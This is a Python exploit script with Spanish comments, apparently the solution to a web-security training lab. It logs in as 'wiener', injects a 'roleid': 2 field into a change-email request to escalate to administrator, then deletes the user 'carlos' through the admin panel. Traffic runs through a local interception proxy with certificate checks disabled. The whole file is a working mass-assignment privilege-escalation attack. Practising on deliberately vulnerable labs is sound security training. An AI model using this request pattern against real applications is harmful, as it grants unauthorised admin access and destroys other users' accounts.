import requests
import sys
import urllib3

# Desactivar advertencias de solicitudes no seguras
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración del proxy
PROXY_SETTINGS = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login_user(session, base_url):
    """Función para autenticar un usuario."""
    login_url = f"{base_url}/login"
    data = {'username': 'wiener', 'password': 'peter'}
    try:
        response = session.post(login_url, data=data, verify=False, proxies=PROXY_SETTINGS)
        if response.status_code == 200:
            print("[+] Login exitoso")
            return True
        else:
            print("[-] Login fallido")
            return False
    except requests.RequestException as e:
        print(f"[-] Error durante el login: {e}")
        return False

def change_user_role(session, base_url):
    """Función para cambiar el rol de un usuario."""
    change_email_url = f"{base_url}/my-account/change-email"
    data_json = {"email": "ingluipt@gmail.com", "roleid": 2}
    try:
        response = session.post(change_email_url, json=data_json, verify=False, proxies=PROXY_SETTINGS)
        if response.status_code == 200:
            print("[+] Rol de usuario cambiado correctamente")
            return True
        else:
            print("[-] Fallo al cambiar el rol de usuario")
            return False
    except requests.RequestException as e:
        print(f"[-] Error al cambiar el rol: {e}")
        return False

def delete_user(session, base_url):
    """Función para eliminar un usuario."""
    admin_panel_url = f"{base_url}/admin/delete?username=carlos"
    try:
        response = session.get(admin_panel_url, verify=False, proxies=PROXY_SETTINGS)
        if response.status_code == 200:
            print("[+] Usuario carlos eliminado con éxito")
            return True
        else:
            print("[-] Fallo al eliminar al usuario")
            return False
    except requests.RequestException as e:
        print(f"[-] Error al eliminar el usuario: {e}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        sys.exit(-1)
    
    session = requests.Session()
    base_url = sys.argv[1]

    if login_user(session, base_url):
        if change_user_role(session, base_url):
            delete_user(session, base_url)

if __name__ == "__main__":
    main()